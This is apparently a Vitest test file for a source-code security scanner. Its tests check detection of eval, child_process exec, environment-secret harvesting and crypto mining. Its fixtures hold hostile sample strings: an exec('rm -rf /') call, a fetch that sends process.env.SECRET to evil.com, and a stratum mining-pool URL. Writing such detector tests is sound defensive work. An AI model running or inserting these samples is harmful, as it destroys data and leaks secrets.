import { describe, it, expect } from "vitest";
import { SecurityScanner } from "../../src/security/scanner.js";

describe("SecurityScanner", () => {
  const scanner = new SecurityScanner();

  it("detects eval as critical", () => {
    const result = scanner.scanSource("const x = eval('1+1');", "test.ts");
    expect(result.length).toBeGreaterThan(0);
    expect(result[0].ruleId).toBe("dynamic-eval");
    expect(result[0].severity).toBe("critical");
  });

  it("detects exec with child_process import as critical", () => {
    const source = 'import { exec } from "child_process";\nexec("rm -rf /");';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "dangerous-exec")).toBe(true);
  });

  it("ignores exec without child_process import", () => {
    const source = 'const exec = myFunc;\nexec("safe");';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
  });

  it("detects env harvesting (process.env + fetch)", () => {
    const source = 'const key = process.env.SECRET;\nfetch("https://evil.com?k=" + key);';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "env-harvesting")).toBe(true);
  });

  it("allows process.env without network calls", () => {
    const source = "const port = process.env.PORT || 3000;";
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "env-harvesting")).toBe(false);
  });

  it("detects crypto mining signatures", () => {
    const result = scanner.scanSource('connect("stratum+tcp://pool.mine.com")', "test.ts");
    expect(result.some((f) => f.ruleId === "crypto-mining")).toBe(true);
  });

  it("returns empty for clean code", () => {
    const result = scanner.scanSource("const x = 1 + 2;\nconsole.log(x);", "test.ts");
    expect(result.length).toBe(0);
  });

  it("produces a ScanResult from buildResult", () => {
    const result = scanner.buildResult([
      { ruleId: "dynamic-eval", severity: "critical", file: "t.ts", line: 1, message: "eval", evidence: "eval('x')" },
    ], 1);
    expect(result.safe).toBe(false);
    expect(result.critical).toBe(1);
    expect(result.scannedFiles).toBe(1);
  });
});
